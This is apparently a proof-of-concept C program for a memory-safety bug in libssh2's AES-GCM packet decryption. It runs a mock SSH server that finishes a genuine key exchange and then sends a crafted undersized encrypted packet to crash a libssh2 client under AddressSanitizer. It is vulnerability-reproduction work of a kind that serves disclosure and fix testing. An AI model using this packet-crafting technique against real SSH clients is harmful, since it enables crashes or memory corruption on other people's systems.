/*
 * PoC for the AES-GCM transport cipher OOB in libssh2's ssh2_cipher_crypt().
 *
 * Drives a libssh2 client session (public API only) through a complete,
 * spec-compliant SSH handshake against an in-process mock SSH server
 * connected over a socketpair (no network involved).  The session
 * negotiates aes128-gcm@openssh.com; once NEWKEYS is done the mock server
 * sends a syntactically valid but very short SSH packet whose final GCM
 * "block" handed to ssh2_cipher_crypt() is smaller than the 16-byte
 * authentication tag.  On a vulnerable build this aborts under
 * AddressSanitizer inside libssh2's packet read path; on a fixed build
 * the packet is rejected with a decrypt error and the process exits
 * cleanly.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <libssh2.h>

#include <openssl/bn.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/core_names.h>

/* ------------------------------------------------------------------ */
/* little wire-buffer builder                                          */

struct wbuf {
    unsigned char *p;
    size_t len;
    size_t cap;
};

static void wb_put(struct wbuf *b, const void *data, size_t n)
{
    if(b->len + n > b->cap) {
        b->cap = (b->len + n) * 2 + 64;
        b->p = realloc(b->p, b->cap);
        if(!b->p)
            _exit(2);
    }
    memcpy(b->p + b->len, data, n);
    b->len += n;
}

static void wb_u32(struct wbuf *b, uint32_t v)
{
    unsigned char t[4] = {
        (unsigned char)(v >> 24), (unsigned char)(v >> 16),
        (unsigned char)(v >> 8), (unsigned char)v
    };
    wb_put(b, t, 4);
}

static void wb_byte(struct wbuf *b, unsigned char v)
{
    wb_put(b, &v, 1);
}

static void wb_string(struct wbuf *b, const void *data, size_t n)
{
    wb_u32(b, (uint32_t)n);
    wb_put(b, data, n);
}

static void wb_namelist(struct wbuf *b, const char *s)
{
    wb_string(b, s, strlen(s));
}

/* mpint: 4-byte length, leading zero byte iff the top bit would be set */
static void wb_mpint(struct wbuf *b, const BIGNUM *bn)
{
    int bits = BN_num_bits(bn);
    int bytes = (bits + 7) / 8;
    int lead = (bits % 8) ? 0 : 1;
    wb_u32(b, (uint32_t)(bytes + lead));
    if(lead)
        wb_byte(b, 0);
    {
        unsigned char *tmp = malloc(bytes ? bytes : 1);
        if(!tmp)
            _exit(2);
        BN_bn2bin(bn, tmp);
        wb_put(b, tmp, bytes);
        free(tmp);
    }
}

/* ------------------------------------------------------------------ */
/* blocking fd helpers (mock server side)                              */

static int read_full(int fd, unsigned char *dst, size_t n)
{
    while(n) {
        ssize_t r = read(fd, dst, n);
        if(r <= 0)
            return -1;
        dst += r;
        n -= (size_t)r;
    }
    return 0;
}

static int write_full(int fd, const unsigned char *src, size_t n)
{
    while(n) {
        ssize_t w = write(fd, src, n);
        if(w <= 0)
            return -1;
        src += w;
        n -= (size_t)w;
    }
    return 0;
}

/* Read one cleartext SSH packet; returns malloc'd payload (type byte first). */
static unsigned char *read_ssh_packet(int fd, size_t *payload_len)
{
    unsigned char hdr[4];
    uint32_t packet_length;
    unsigned char *pkt;
    unsigned char padlen;
    size_t plen;

    if(read_full(fd, hdr, 4))
        return NULL;
    packet_length = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
                    ((uint32_t)hdr[2] << 8) | hdr[3];
    if(packet_length < 2 || packet_length > (1u << 20))
        return NULL;
    pkt = malloc(packet_length);
    if(!pkt)
        return NULL;
    if(read_full(fd, pkt, packet_length)) {
        free(pkt);
        return NULL;
    }
    padlen = pkt[0];
    if(padlen > packet_length - 1) {
        free(pkt);
        return NULL;
    }
    plen = packet_length - 1 - padlen;
    memmove(pkt, pkt + 1, plen);
    *payload_len = plen;
    return pkt;
}

/* Frame and send one cleartext SSH packet. */
static int send_ssh_packet(int fd, const unsigned char *payload, size_t plen)
{
    struct wbuf pkt = { 0 };
    size_t padlen = 8 - ((plen + 5) % 8);
    int rc;
    if(padlen < 4)
        padlen += 8;
    wb_u32(&pkt, (uint32_t)(plen + 1 + padlen));
    wb_byte(&pkt, (unsigned char)padlen);
    wb_put(&pkt, payload, plen);
    while(padlen--)
        wb_byte(&pkt, 0);
    rc = write_full(fd, pkt.p, pkt.len);
    free(pkt.p);
    return rc;
}

/* ------------------------------------------------------------------ */
/* mock server (runs in the forked child)                              */

/* RFC 3526 group14 (2048-bit MODP), same group libssh2 uses */
static const unsigned char group14_p[256] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
    0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
    0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
    0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
    0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
    0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
    0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
    0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
    0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
    0x49, 0x28, 0x66, 0x51, 0xEC, 0xE4, 0x5B, 0x3D,
    0xC2, 0x00, 0x7C, 0xB8, 0xA1, 0x63, 0xBF, 0x05,
    0x98, 0xDA, 0x48, 0x36, 0x1C, 0x55, 0xD3, 0x9A,
    0x69, 0x16, 0x3F, 0xA8, 0xFD, 0x24, 0xCF, 0x5F,
    0x83, 0x65, 0x5D, 0x23, 0xDC, 0xA3, 0xAD, 0x96,
    0x1C, 0x62, 0xF3, 0x56, 0x20, 0x85, 0x52, 0xBB,
    0x9E, 0xD5, 0x29, 0x07, 0x70, 0x96, 0x96, 0x6D,
    0x67, 0x0C, 0x35, 0x4E, 0x4A, 0xBC, 0x98, 0x04,
    0xF1, 0x74, 0x6C, 0x08, 0xCA, 0x18, 0x21, 0x7C,
    0x32, 0x90, 0x5E, 0x46, 0x2E, 0x36, 0xCE, 0x3B,
    0xE3, 0x9E, 0x77, 0x2C, 0x18, 0x0E, 0x86, 0x03,
    0x9B, 0x27, 0x83, 0xA2, 0xEC, 0x07, 0xA2, 0x8F,
    0xB5, 0xC5, 0x5D, 0xF0, 0x6F, 0x4C, 0x52, 0xC9,
    0xDE, 0x2B, 0xCB, 0xF6, 0x95, 0x58, 0x17, 0x18,
    0x39, 0x95, 0x49, 0x7C, 0xEA, 0x95, 0x6A, 0xE5,
    0x15, 0xD2, 0x26, 0x18, 0x98, 0xFA, 0x05, 0x10,
    0x15, 0x72, 0x8E, 0x5A, 0x8A, 0xAC, 0xAA, 0x68,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};

static void sha256_once(const unsigned char *data, size_t n,
                        unsigned char out[32])
{
    size_t olen = 0;
    if(!EVP_Q_digest(NULL, "SHA256", NULL, data, n, out, &olen) || olen != 32)
        _exit(2);
}

static void mock_server(int fd)
{
    unsigned char ch;
    struct wbuf vc = { 0 };            /* client banner (no CRLF) */
    const char *vs = "SSH-2.0-pocserver";
    size_t ic_len, is_len, plen;
    unsigned char *ic, *is, *payload;
    struct wbuf kexinit = { 0 };
    static const unsigned char cookie[16] = {
        1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16
    };
    BN_CTX *bnctx;
    BIGNUM *p, *g, *y, *f, *e, *k;
    unsigned char *e_raw;              /* client mpint e, verbatim */
    size_t e_raw_len;
    EVP_PKEY *rsa;
    BIGNUM *rsa_n = NULL, *rsa_e = NULL;
    struct wbuf ks = { 0 };            /* host key blob */
    struct wbuf h_in = { 0 };
    unsigned char h[32];
    struct wbuf reply = { 0 }, sig_blob = { 0 };
    unsigned char news = 21;
    struct wbuf kd = { 0 };
    unsigned char iv[32], key[32];
    EVP_CIPHER_CTX *gcm;
    unsigned char aad[4] = { 0, 0, 0, 5 };   /* packet_length = 5 */
    unsigned char pt[5] = { 4, 0, 0, 0, 0 }; /* padlen 4, empty payload */
    unsigned char ct[5], tag[16];
    int outl, tmplen;
    unsigned char lastiv[16];
    struct wbuf crafted = { 0 };

    /* ---- banners ---- */
    for(;;) {                          /* read client banner line */
        if(read_full(fd, &ch, 1))
            _exit(1);
        if(ch == '\n')
            break;
        if(ch != '\r')
            wb_put(&vc, &ch, 1);
    }
    if(write_full(fd, (const unsigned char *)vs, strlen(vs)) ||
       write_full(fd, (const unsigned char *)"\r\n", 2))
        _exit(1);

    /* ---- client KEXINIT ---- */
    ic = read_ssh_packet(fd, &ic_len);
    if(!ic || ic_len < 1 || ic[0] != 20)
        _exit(1);

    /* ---- our KEXINIT ---- */
    wb_byte(&kexinit, 20);
    wb_put(&kexinit, cookie, sizeof(cookie));
    wb_namelist(&kexinit, "diffie-hellman-group14-sha256");
    wb_namelist(&kexinit, "rsa-sha2-256");
    wb_namelist(&kexinit, "aes128-gcm@openssh.com");
    wb_namelist(&kexinit, "aes128-gcm@openssh.com");
    wb_namelist(&kexinit, "hmac-sha2-256");
    wb_namelist(&kexinit, "hmac-sha2-256");
    wb_namelist(&kexinit, "none");
    wb_namelist(&kexinit, "none");
    wb_namelist(&kexinit, "");
    wb_namelist(&kexinit, "");
    wb_byte(&kexinit, 0);
    wb_u32(&kexinit, 0);
    is = malloc(kexinit.len);
    if(!is)
        _exit(2);
    memcpy(is, kexinit.p, kexinit.len);
    is_len = kexinit.len;
    if(send_ssh_packet(fd, kexinit.p, kexinit.len))
        _exit(1);

    /* ---- client KEXDH_INIT ---- */
    payload = read_ssh_packet(fd, &plen);
    if(!payload || plen < 5 || payload[0] != 30)
        _exit(1);
    e_raw = payload + 1;               /* u32 length + bytes, as sent */
    e_raw_len = plen - 1;

    /* ---- server DH ---- */
    bnctx = BN_CTX_new();
    p = BN_bin2bn(group14_p, sizeof(group14_p), NULL);
    g = BN_new();
    y = BN_new();
    f = BN_new();
    k = BN_new();
    BN_set_word(g, 2);
    if(!BN_rand(y, 256, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY))
        _exit(2);
    e = BN_bin2bn(e_raw + 4, (int)(e_raw_len - 4), NULL);
    if(!BN_mod_exp(f, g, y, p, bnctx))
        _exit(2);
    if(!BN_mod_exp(k, e, y, p, bnctx))
        _exit(2);

    /* ---- host key ---- */
    rsa = EVP_RSA_gen(2048);
    if(!rsa)
        _exit(2);
    if(!EVP_PKEY_get_bn_param(rsa, OSSL_PKEY_PARAM_RSA_N, &rsa_n) ||
       !EVP_PKEY_get_bn_param(rsa, OSSL_PKEY_PARAM_RSA_E, &rsa_e))
        _exit(2);
    wb_string(&ks, "ssh-rsa", 7);
    wb_mpint(&ks, rsa_e);
    wb_mpint(&ks, rsa_n);

    /* ---- exchange hash H ---- */
    wb_string(&h_in, vc.p, vc.len);
    wb_string(&h_in, vs, strlen(vs));
    wb_string(&h_in, ic, ic_len);
    wb_string(&h_in, is, is_len);
    wb_string(&h_in, ks.p, ks.len);
    wb_put(&h_in, e_raw, e_raw_len);   /* mpint e verbatim */
    wb_mpint(&h_in, f);
    wb_mpint(&h_in, k);
    sha256_once(h_in.p, h_in.len, h);

    /* ---- signature over H (rsa-sha2-256) ---- */
    {
        EVP_MD_CTX *mctx = EVP_MD_CTX_new();
        EVP_PKEY_CTX *pctx = NULL;
        unsigned char *sig = NULL;
        size_t siglen = 0;
        if(EVP_DigestSignInit(mctx, &pctx, EVP_sha256(), NULL, rsa) != 1)
            _exit(2);
        EVP_PKEY_CTX_set_rsa_padding(pctx, RSA_PKCS1_PADDING);
        if(EVP_DigestSign(mctx, NULL, &siglen, h, sizeof(h)) != 1)
            _exit(2);
        sig = malloc(siglen);
        if(!sig)
            _exit(2);
        if(EVP_DigestSign(mctx, sig, &siglen, h, sizeof(h)) != 1)
            _exit(2);
        wb_string(&sig_blob, "rsa-sha2-256", 12);
        wb_string(&sig_blob, sig, siglen);
        free(sig);
        EVP_MD_CTX_free(mctx);
    }

    /* ---- KEXDH_REPLY + NEWKEYS ---- */
    wb_byte(&reply, 31);
    wb_string(&reply, ks.p, ks.len);
    wb_mpint(&reply, f);
    wb_string(&reply, sig_blob.p, sig_blob.len);
    if(send_ssh_packet(fd, reply.p, reply.len))
        _exit(1);
    if(send_ssh_packet(fd, &news, 1))
        _exit(1);

    /* ---- client NEWKEYS ---- */
    free(payload);
    payload = read_ssh_packet(fd, &plen);
    if(!payload || plen != 1 || payload[0] != 21)
        _exit(1);

    /* ---- derive server->client GCM key material ----
       session_id = H; iv = HASH(K||H||"B"||H), key = HASH(K||H||"D"||H) */
    wb_mpint(&kd, k);                  /* K as mpint */
    wb_put(&kd, h, sizeof(h));
    wb_byte(&kd, 'B');
    wb_put(&kd, h, sizeof(h));
    sha256_once(kd.p, kd.len, iv);
    kd.len = 0;
    wb_mpint(&kd, k);
    wb_put(&kd, h, sizeof(h));
    wb_byte(&kd, 'D');
    wb_put(&kd, h, sizeof(h));
    sha256_once(kd.p, kd.len, key);

    /* ---- craft the malicious packet ----
       packet_length 5 (AAD) || 5 encrypted bytes || 16-byte tag.
       libssh2 decrypts the 16-byte first block, then hands the final
       9 bytes as one "last block" to the transport cipher; those 9
       bytes are smaller than the 16-byte GCM tag they must carry. */
    gcm = EVP_CIPHER_CTX_new();
    if(EVP_EncryptInit_ex(gcm, EVP_aes_128_gcm(), NULL, key, iv) != 1)
        _exit(2);
    if(EVP_CIPHER_CTX_ctrl(gcm, EVP_CTRL_AEAD_SET_IV_FIXED, -1, iv) != 1)
        _exit(2);
    if(EVP_CIPHER_CTX_ctrl(gcm, EVP_CTRL_GCM_IV_GEN, 1, lastiv) != 1)
        _exit(2);
    if(EVP_EncryptUpdate(gcm, NULL, &outl, aad, sizeof(aad)) != 1)
        _exit(2);
    if(EVP_EncryptUpdate(gcm, ct, &outl, pt, sizeof(pt)) != 1 || outl != 5)
        _exit(2);
    if(EVP_EncryptFinal_ex(gcm, ct + outl, &tmplen) != 1)
        _exit(2);
    if(EVP_CIPHER_CTX_ctrl(gcm, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1)
        _exit(2);

    wb_put(&crafted, aad, sizeof(aad));
    wb_put(&crafted, ct, sizeof(ct));
    wb_put(&crafted, tag, sizeof(tag));
    if(write_full(fd, crafted.p, crafted.len))
        _exit(1);

    /* drain whatever the client sends next (service request etc.) so a
       surviving client never blocks on a full socket buffer */
    {
        unsigned char sink[4096];
        (void)read(fd, sink, sizeof(sink));
    }

    _exit(0);
}

/* ------------------------------------------------------------------ */

int main(void)
{
    int sv[2];
    pid_t child;
    LIBSSH2_SESSION *session;
    int rc, status;

    signal(SIGPIPE, SIG_IGN);

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, sv)) {
        fprintf(stderr, "poc: socketpair failed\n");
        return 2;
    }

    child = fork();
    if(child < 0) {
        fprintf(stderr, "poc: fork failed\n");
        return 2;
    }
    if(child == 0) {
        close(sv[0]);
        alarm(30);                     /* never linger as an orphan */
        mock_server(sv[1]);
        _exit(0);
    }

    close(sv[1]);

    libssh2_init(0);
    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "poc: libssh2_session_init failed\n");
        return 2;
    }

    /* deterministic protocol choice, all via documented public API */
    libssh2_session_banner_set(session, "SSH-2.0-pocclient");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_KEX,
                                "diffie-hellman-group14-sha256");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_HOSTKEY,
                                "rsa-sha2-256");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_CS,
                                "aes128-gcm@openssh.com");
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_SC,
                                "aes128-gcm@openssh.com");
    libssh2_session_set_blocking(session, 1);

    rc = libssh2_session_handshake(session, sv[0]);
    if(rc) {
        fprintf(stderr, "poc: handshake returned %d (no memory error)\n", rc);
        libssh2_session_free(session);
        libssh2_exit();
        close(sv[0]);
        waitpid(child, &status, 0);
        return 0;
    }
    fprintf(stderr, "poc: handshake ok, requesting authentication\n");

    /* triggers the transport read of the crafted packet */
    rc = libssh2_userauth_password_ex(session, "u", 1, "p", 1, NULL);
    fprintf(stderr, "poc: userauth_password returned %d (no memory error)\n",
            rc);

    libssh2_session_free(session);
    libssh2_exit();
    close(sv[0]);
    waitpid(child, &status, 0);
    return 0;
}
